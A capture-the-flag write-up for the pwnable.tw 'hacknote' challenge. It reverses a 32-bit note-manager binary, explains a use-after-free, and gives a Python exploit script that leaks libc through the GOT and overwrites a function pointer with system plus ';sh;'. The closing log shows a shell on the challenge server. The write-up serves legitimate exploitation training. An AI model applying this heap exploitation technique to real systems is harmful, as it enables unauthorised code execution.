# Hacknote (pwnable.tw)
We are given a 32bit elf binary and a libc.  
```console
┌──(kali㉿kali)-[~/CTF/pwnable_tw/hacknote]
└─$ checksec --file=./hacknote                                                                   130 ⨯
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols       FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No     0               2               ./hacknote
```
## Reversing
We have 4 options:
```console
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :
```
        
These options manipulate a global array of pointer to note structs.
The note structs are defined as follows:
```c
struct Note {
   void* print_function;
   char* content;
}
```
#### Adding a note
First, mallocing a note struct and placing it in the array.
```asm
push    8               ; size
call    _malloc
add     esp, 10h
mov     edx, eax
mov     eax, [ebp+index]
mov     ds:note_array[eax*4], edx
```
Then, placing a function that takes a pointer to a Note struct and prints it's content.
```asm
mov     eax, [ebp+index]
mov     eax, ds:note_array[eax*4]
mov     dword ptr [eax], offset note_print_self
```
Finally, mallocing a ptr of user supplied size to the note's content.
```asm
sub     esp, 0Ch
push    eax             ; size
call    _malloc
add     esp, 10h
mov     [ebx+4], eax    ; ebx - a ptr to a note struct
```
#### Deleting a note
Freeing a note at a given index(bound checked) as long as the ptr is non-null.
First, the note's content is freed(but the ptr isn't zeroed).
Then, the note itself is freed(that ptr isn't zeroed either)
```asm
mov     eax, ds:note_array[eax*4]
mov     eax, [eax+4]
sub     esp, 0Ch
push    eax             ; ptr
call    _free
add     esp, 10h
mov     eax, [ebp+index]
mov     eax, ds:note_array[eax*4]
sub     esp, 0Ch
push    eax             ; ptr
call    _free
add     esp, 10h
```
#### Printing a note
Simply calls the functions at note->print_function (offset 0x0) and passes a ptr to the note to it.
```asm
mov     eax, [ebp+index]
mov     eax, ds:note_array[eax*4]
mov     eax, [eax]
mov     edx, [ebp+index]
mov     edx, ds:note_array[edx*4]
sub     esp, 0Ch
push    edx
call    eax
```
## Vulnerability
The vulnerability is obvious, a use-after-free.      
(there is also a double-free but exploiting the use-after-free is simpler)
```console
┌──(kali㉿kali)-[~/CTF/pwnable_tw/hacknote]
└─$ ./hacknote                                                                                   130 ⨯
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :5
Content :aaaa
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :2
Index :0
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :3
Index :0
zsh: segmentation fault  ./hacknote
```
## Exploitation
If we could recieve a ptr from malloc as a note's content that is the same as a freed note's address we cloud overwrite the print function and call some_addr(Note* note_ptr).
How can we do that?     
Let's predict the heap bins and devise a plan:
```
// adding 2 notes: both with content size that won't be put in the fastbin.

// freeing note 0 and then note 1
fastbin 0x10: note1 -> note0

// allocating a note with content of size 8
// it's content will be a ptr to node0.
// we'll edit that note so it'll call the note_print_self function (that was already there)
// and we'll change the content to point to got puts(to break aslr)
fastbin 0x10: (empty)

// print note at index 0 (it'll print the note's "content" which is puts in the got.

// we'll then delete that note
fastbin 0x10: note1( = note2) -> note0( = note2 content)

// and allocate a new one with content of size 8.
// that note's content will point to note0 as well.
// this time we'll calculate system offset from puts and call system(ptr_to_node).
// we'll also put ;sh; after the function ptr so the shell command that ptr_to_node will point to is:
// <address of system> ; sh ; <garbage until null byte>
```

The script flow is as follows
```py
def main():
    add_note(1000, b'0')
    add_note(1000, b'1')

    delete_note(0)
    delete_note(1)
    
    add_note(8, p32(NOTE_PRINT_SELF_ADDR) + p32(elf.got['puts']))
    print_note(0)
    
    puts_addr = u32(conn.recv(4))
    print(f"[+] PUTS ADDR: {hex(puts_addr)}")
    
    libc_addr = puts_addr - libc.symbols['puts']
    print(f"[+] LIBC ADDR: {hex(libc_addr)}")
    
    system_addr = libc_addr + libc.symbols['system']
    print(f'[+] SYSTEM ADDR: {hex(system_addr)}')
    
    delete_note(2)
    add_note(8, p32(system_addr) + b';sh;')

    print_note(0)
    conn.interactive()
```
```console
┌──(kali㉿kali)-[~/CTF/pwnable_tw/hacknote]
└─$ python3 sploit.py               
[+] Opening connection to chall.pwnable.tw on port 10102: Done
[*] '/home/kali/CTF/pwnable_tw/hacknote/libc_32.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/kali/CTF/pwnable_tw/hacknote/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
b'----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Note size :'
b'Content :'
b'Success !\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Note size :'
b'Content :'
b'Success !\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Index :'
b'Success\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Index :'
b'Success\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Note size :'
b'Content :'
b'Success !\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Invalid choice\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :Index :'
[+] PUTS ADDR: 0xf766d140
[+] LIBC ADDR: 0xf760e000
[+] SYSTEM ADDR: 0xf7648940
b'\xe6\x84\x04\x08@eb\xf7\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Index :'
b'Success\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Note size :'
b'Content :'
b'Success !\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :'
b'Invalid choice\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :Index :'
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd home
$ ls
hacknote
$ cd hacknote
$ ls
flag
hacknote
run.sh
$ cat flag
****censored****
```
